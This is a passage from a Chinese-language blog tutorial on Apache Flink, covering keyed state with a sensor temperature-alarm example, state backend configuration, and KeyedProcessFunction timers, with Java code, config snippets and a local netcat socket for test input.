title="场景测试"></a>场景测试</h5><p>假设做一个温度报警，如果一个传感器前后温差超过10度就报警。这里使用键控状态Keyed State + flatMap来实现</p><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.RichFlatMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple3;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 6:37 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest3_KeyedStateApplicationCase</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度 = 1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 从socket获取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line">    <span class="comment">// 转换为SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    SingleOutputStreamOperator&lt;Tuple3&lt;String, Double, Double&gt;&gt; resultStream = dataStream.keyBy(SensorReading::getId).flatMap(<span class="keyword">new</span> MyFlatMapper(<span class="number">10.0</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果 传感器温度 前后差距超过指定温度(这里指定10.0),就报警</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFlatMapper</span> <span class="keyword">extends</span> <span class="title">RichFlatMapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple3</span>&lt;<span class="title">String</span>, <span class="title">Double</span>, <span class="title">Double</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 报警的温差阈值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Double threshold;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录上一次的温度</span></span><br><span class="line">    ValueState&lt;Double&gt; lastTemperature;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFlatMapper</span><span class="params">(Double threshold)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.threshold = threshold;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 从运行时上下文中获取keyedState</span></span><br><span class="line">      lastTemperature = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Double&gt;(<span class="string">&quot;last-temp&quot;</span>, Double.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 手动释放资源</span></span><br><span class="line">      lastTemperature.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(SensorReading value, Collector&lt;Tuple3&lt;String, Double, Double&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Double lastTemp = lastTemperature.value();</span><br><span class="line">      Double curTemp = value.getTemperature();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果不为空，判断是否温差超过阈值，超过则报警</span></span><br><span class="line">      <span class="keyword">if</span> (lastTemp != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(curTemp - lastTemp) &gt;= threshold) &#123;</span><br><span class="line">          out.collect(<span class="keyword">new</span> Tuple3&lt;&gt;(value.getId(), lastTemp, curTemp));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 更新保存的&quot;上一次温度&quot;</span></span><br><span class="line">      lastTemperature.update(curTemp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动socket  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>输入数据，查看结果 </p><ul><li><p> 输入  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,32.4</span><br><span class="line">sensor_1,1547718199,42.4</span><br><span class="line">sensor_10,1547718205,52.6   </span><br><span class="line">sensor_10,1547718205,22.5</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_7,1547718202,9.9</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_7,1547718202,19.9</span><br><span class="line">sensor_7,1547718202,30</span><br></pre></td></tr></table></figure></li><li><p> 输出<br><em>中间没有输出（sensor_7,9.9,19.9)，应该是double浮点数计算精度问题，不管它</em>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(sensor_1,32.4,42.4)</span><br><span class="line">(sensor_10,52.6,22.5)</span><br><span class="line">(sensor_7,19.9,30.0)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="状态后端-State-Backends"><a href="#状态后端-State-Backends" class="headerlink" title="状态后端 State Backends"></a>状态后端 State Backends</h4><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108430338">Flink_Flink中的状态</a></p></blockquote><h5 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h5><ul><li> 每传入一条数据，有状态的算子任务都会读取和更新状态。 </li><li> 由于有效的状态访问对于处理数据的低延迟至关重要，因此每个并行任务都会在本地维护其状态，以确保快速的状态访问。 </li><li> 状态的存储、访问以及维护，由一个可插入的组件决定，这个组件就叫做<strong>状态后端( state backend)</strong> </li><li> <strong>状态后端主要负责两件事：本地状态管理，以及将检查点(checkPoint)状态写入远程存储</strong> </li></ul><h5 id="选择一个状态后端"><a href="#选择一个状态后端" class="headerlink" title="选择一个状态后端"></a>选择一个状态后端</h5><ul><li>MemoryStateBackend <ul><li>内存级的状态后端，会将键控状态作为内存中的对象进行管理，将它们存储在TaskManager的JVM堆上，而将checkpoint存储在JobManager的内存中</li><li>特点：快速、低延迟，但不稳定</li></ul></li><li>FsStateBackend（默认） <ul><li>将checkpoint存到远程的持久化文件系统（FileSystem）上，而对于本地状态，跟MemoryStateBackend一样，也会存在TaskManager的JVM堆上</li><li>同时拥有内存级的本地访问速度，和更好的容错保证</li></ul></li><li>RocksDBStateBackend <ul><li>将所有状态序列化后，存入本地的RocksDB中存储</li></ul></li></ul><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p><code>flink-conf.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###==============================================================================</span></span><br><span class="line"><span class="comment">### Fault tolerance and checkpointing</span></span><br><span class="line"><span class="comment">###==============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### The backend that will be used to store operator state checkpoints if</span></span><br><span class="line"><span class="comment">### checkpointing is enabled.</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### Supported backends are &#x27;jobmanager&#x27;, &#x27;filesystem&#x27;, &#x27;rocksdb&#x27;, or the</span></span><br><span class="line"><span class="comment">### &lt;class-name-of-factory&gt;.</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### state.backend: filesystem</span></span><br><span class="line"><span class="string">上面这个就是默认的checkpoint存在filesystem</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### Directory for checkpoints filesystem, when using any of the default bundled</span></span><br><span class="line"><span class="comment">### state backends.</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### state.checkpoints.dir: hdfs://namenode-host:port/flink-checkpoints</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Default target directory for savepoints, optional.</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### state.savepoints.dir: hdfs://namenode-host:port/flink-savepoints</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Flag to enable/disable incremental checkpoints for backends that</span></span><br><span class="line"><span class="comment">### support incremental checkpoints (like the RocksDB state backend). </span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### state.backend.incremental: false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### The failover strategy, i.e., how the job computation recovers from task failures.</span></span><br><span class="line"><span class="comment">### Only restart tasks that may have been affected by the task failure, which typically includes</span></span><br><span class="line"><span class="comment">### downstream tasks and potentially upstream tasks if their produced data is no longer available for consumption.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobmanager.execution.failover-strategy:</span> <span class="string">region</span></span><br><span class="line"></span><br><span class="line"><span class="string">上面这个region指，多个并行度的任务要是有个挂掉了，只重启那个任务所属的region（可能含有多个子任务），而不需要重启整个Flink程序</span></span><br></pre></td></tr></table></figure><h5 id="样例代码"><a href="#样例代码" class="headerlink" title="样例代码"></a>样例代码</h5><ul><li><p> 其中使用RocksDBStateBackend需要另外加入pom依赖  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- RocksDBStateBackend --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-statebackend-rocksdb_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.restartstrategy.RestartStrategies;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.contrib.streaming.state.RocksDBStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.runtime.state.filesystem.FsStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.runtime.state.memory.MemoryStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.CheckpointingMode;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 11:35 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest4_FaultTolerance</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 状态后端配置</span></span><br><span class="line">        env.setStateBackend(<span class="keyword">new</span> MemoryStateBackend());</span><br><span class="line">        env.setStateBackend(<span class="keyword">new</span> FsStateBackend(<span class="string">&quot;checkpointDataUri&quot;</span>));</span><br><span class="line">        <span class="comment">// 这个需要另外导入依赖</span></span><br><span class="line">        env.setStateBackend(<span class="keyword">new</span> RocksDBStateBackend(<span class="string">&quot;checkpointDataUri&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// socket文本流</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        dataStream.print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ProcessFunction-API-底层API"><a href="#ProcessFunction-API-底层API" class="headerlink" title="ProcessFunction API(底层API)"></a>ProcessFunction API(底层API)</h3><pre><code>我们之前学习的**转换算子**是无法访问事件的时间戳信息和水位线信息的。而这在一些应用场景下，极为重要。例如MapFunction这样的map转换算子就无法访问时间戳或者当前事件的事件时间。基于此，DataStream API提供了一系列的Low-Level转换算子。可以**访问时间戳**、**watermark**以及**注册定时事件**。还可以输出**特定的一些事件**，例如超时事件等。Process Function用来构建事件驱动的应用以及实现自定义的业务逻辑(使用之前的window函数和转换算子无法实现)。例如，FlinkSQL就是使用Process Function实现的。</code></pre><p>Flink提供了8个Process Function：</p><ul><li>ProcessFunction</li><li>KeyedProcessFunction</li><li>CoProcessFunction</li><li>ProcessJoinFunction</li><li>BroadcastProcessFunction</li><li>KeyedBroadcastProcessFunction</li><li>ProcessWindowFunction</li><li>ProcessAllWindowFunction</li></ul><h4 id="KeyedProcessFunction"><a href="#KeyedProcessFunction" class="headerlink" title="KeyedProcessFunction"></a>KeyedProcessFunction</h4><pre><code>这个是相对比较常用的ProcessFunction，根据名字就可以知道是用在keyedStream上的。KeyedProcessFunction用来操作KeyedStream。KeyedProcessFunction会处理流的每一个元素，输出为0个、1个或者多个元素。所有的Process Function都继承自RichFunction接口，所以都有`open()`、`close()`和`getRuntimeContext()`等方法。而`KeyedProcessFunction&lt;K, I, O&gt;`还额外提供了两个方法:</code></pre><ul><li><code>processElement(I value, Context ctx, Collector&lt;O&gt; out)</code>，流中的每一个元素都会调用这个方法，调用结果将会放在Collector数据类型中输出。Context可以访问元素的时间戳，元素的 key ，以及TimerService 时间服务。 Context 还可以将结果输出到别的流(side outputs)。</li><li><code>onTimer(long timestamp, OnTimerContext ctx, Collector&lt;O&gt; out)</code>，是一个回调函数。当之前注册的定时器触发时调用。参数timestamp 为定时器所设定的触发的时间戳。Collector 为输出结果的集合。OnTimerContext和processElement的Context 参数一样，提供了上下文的一些信息，例如定时器触发的时间信息(事件时间或者处理时间)。</li></ul><h5 id="测试代码-3"><a href="#测试代码-3" class="headerlink" title="测试代码"></a>测试代码</h5><p>设置一个获取数据后第5s给出提示信息的定时器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> processfunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 12:30 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessTest1_KeyedProcessFunction</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket文本流</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试KeyedProcessFunction，先分组然后自定义处理</span></span><br><span class="line">    dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .process( <span class="keyword">new</span> MyProcess() )</span><br><span class="line">      .print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的处理函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProcess</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Tuple</span>, <span class="title">SensorReading</span>, <span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    ValueState&lt;Long&gt; tsTimerState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      tsTimerState =  getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;ts-timer&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(SensorReading value, Context ctx, Collector&lt;Integer&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(value.getId().length());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// context</span></span><br><span class="line">      <span class="comment">// Timestamp of the element currently being processed or timestamp of a firing timer.</span></span><br><span class="line">      ctx.timestamp();</span><br><span class="line">      <span class="comment">// Get key of the element being processed.</span></span><br><span class="line">      ctx.getCurrentKey();</span><br><span class="line">      <span class="comment">//            ctx.output();</span></span><br><span class="line">      ctx.timerService().currentProcessingTime();</span><br><span class="line">      ctx.timerService().currentWatermark();</span><br><span class="line">      <span class="comment">// 在5处理时间的5秒延迟后触发</span></span><br><span class="line">      ctx.timerService().registerProcessingTimeTimer( ctx.timerService().currentProcessingTime() + <span class="number">5000L</span>);</span><br><span class="line">      tsTimerState.update(ctx.timerService().currentProcessingTime() + <span class="number">1000L</span>);</span><br><span class="line">      <span class="comment">//            ctx.timerService().registerEventTimeTimer((value.getTimestamp() + 10) * 1000L);</span></span><br><span class="line">      <span class="comment">// 删除指定时间触发的定时器</span></span><br><span class="line">      <span class="comment">//            ctx.timerService().deleteProcessingTimeTimer(tsTimerState.value());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;Integer&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      System.out.println(timestamp + <span class="string">&quot; 定时器触发&quot;</span>);</span><br><span class="line">      ctx.getCurrentKey();</span><br><span class="line">      <span class="comment">//            ctx.output();</span></span><br><span class="line">      ctx.timeDomain();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      tsTimerState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动本地socket</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 